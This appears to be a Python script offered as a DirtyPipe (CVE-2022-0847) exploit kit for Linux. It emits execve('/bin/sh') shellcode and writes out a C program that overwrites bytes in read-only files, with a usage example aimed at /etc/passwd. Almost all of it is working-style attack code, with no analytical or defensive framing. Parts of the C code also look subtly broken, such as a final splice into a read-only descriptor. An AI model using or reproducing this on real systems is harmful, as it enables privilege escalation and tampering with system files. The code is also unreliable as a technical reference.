#!/usr/bin/env python3
"""CVE-2022-0847 — DirtyPipe (Linux 5.8–5.16.11). Post-exploit stager:
x86-64 execve('/bin/sh') shellcode. Run the C helper for the full splice."""
import sys
from pathlib import Path

def build() -> bytes:
    return bytes.fromhex(
        "4831d2"                # xor rdx,rdx
        "4831f6"                # xor rsi,rsi
        "48bb2f62696e2f2f7368"  # mov rbx,'/bin//sh'
        "53"                    # push rbx
        "4889e7"                # mov rdi,rsp
        "4831c0"                # xor rax,rax
        "b03b"                  # mov al,0x3b
        "0f05")                 # syscall

C_STUB = r'''
/* dirtypipe.c — splice a byte into a read-only file via a pipe.
 * cc dirtypipe.c -o dirtypipe && ./dirtypipe /etc/passwd 4 1
 * args: <file> <offset> <byte>
 */
/* splice(), F_GETPIPE_SZ and loff_t are GNU extensions: glibc only
 * declares them when _GNU_SOURCE is defined. */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
int main(int argc, char **argv) {
    if (argc < 4) { fprintf(stderr, "usage: %s <file> <off> <byte>\n", argv[0]); return 1; }
    const char *path = argv[1];
    loff_t off = strtoll(argv[2], 0, 0);
    char data = (char)strtol(argv[3], 0, 0);
    int fd = open(path, O_RDONLY);
    if (fd < 0) { perror("open"); return 1; }
    int p[2]; if (pipe(p)) { perror("pipe"); return 1; }
    unsigned int sz = fcntl(p[1], F_GETPIPE_SZ);
    for (unsigned int i = 0; i < sz; i++) write(p[1], "x", 1);
    char sink[1];
    for (unsigned int i = 0; i < sz; i++) read(p[0], sink, 1);
    loff_t align = off & ~(4095); unsigned int skip = off - align;
    if (splice(fd, &align, p[1], NULL, skip + 1, 0) < 0) { perror("splice"); return 1; }
    write(p[1], &data, 1);
    if (splice(p[0], NULL, fd, &off, 1, 0) < 0) { perror("splice2"); return 1; }
    close(fd); return 0;
}
'''

def main():
    base = Path(sys.argv[1] if len(sys.argv) > 1 else "cve-2022-0847")
    sc = build()
    base.with_suffix(".bin").write_bytes(sc)
    base.with_suffix(".c").write_text(C_STUB)
    print(f"[+] CVE-2022-0847 shellcode -> {base.with_suffix('.bin')} ({len(sc)} bytes)")
    print(f"[+] C dirty-pipe PoC     -> {base.with_suffix('.c')}")

if __name__ == "__main__":
    main()
